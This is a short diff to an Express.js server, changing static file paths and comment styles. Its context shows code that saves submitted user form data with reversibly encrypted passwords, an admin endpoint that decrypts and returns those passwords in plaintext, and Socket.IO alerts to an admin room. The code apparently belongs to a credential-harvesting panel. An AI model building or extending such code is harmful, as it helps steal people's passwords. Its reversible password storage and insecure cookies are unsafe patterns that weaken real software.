@@ -57,11 +57,11 @@ app.use(session({
   cookie: { secure: false }
 }));
 
-// Serve admin static files
-app.use('/admin/static', express.static(path.join(__dirname, 'public', 'admin')));
-app.use('/sounds', express.static(path.join(__dirname, 'public', 'sounds')));
+// --- Ajuste de rutas de archivos estáticos --- //
+app.use('/admin/static', express.static(path.join(__dirname, 'admin')));
+app.use('/sounds', express.static(path.join(__dirname, 'sounds')));
 
-// Simple admin auth (session-based)
+// --- Simple admin auth (session-based) ---
 app.post('/admin/login', (req, res) => {
   const { user, pass } = req.body;
   if (user === process.env.ADMIN_USER && pass === process.env.ADMIN_PASS) {
@@ -78,7 +78,7 @@ function requireAdmin(req, res, next){
   return res.status(401).json({ ok: false, msg: 'unauthorized' });
 }
 
-// API to save incoming user form data (via fetch)
+// --- API to save incoming user form data (via fetch) ---
 app.post('/api/save', (req, res) => {
   const body = req.body || {};
   const clientId = body.clientId || uuidv4();
@@ -104,7 +104,7 @@ app.post('/api/save', (req, res) => {
   res.json({ ok: true, clientId });
 });
 
-// Admin endpoints
+// --- Admin endpoints ---
 app.get('/admin/records', requireAdmin, (req, res) => {
   const all = db.getAllUsers();
   res.json(all.map(r => ({ ...r, password_enc: r.password_enc })));
@@ -128,12 +128,12 @@ app.get('/admin/decrypt/:clientId', requireAdmin, (req, res) => {
   res.json({ ok: true, password: decrypted });
 });
 
-// Simple admin UI entry
+// --- Simple admin UI entry ---
 app.get('/admin', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
+  res.sendFile(path.join(__dirname, 'admin', 'index.html'));
 });
 
-// Socket.IO connection handling
+// --- Socket.IO connection handling ---
 io.on('connection', (socket) => {
   socket.on('register_admin', () => {
     socket.join('admins');
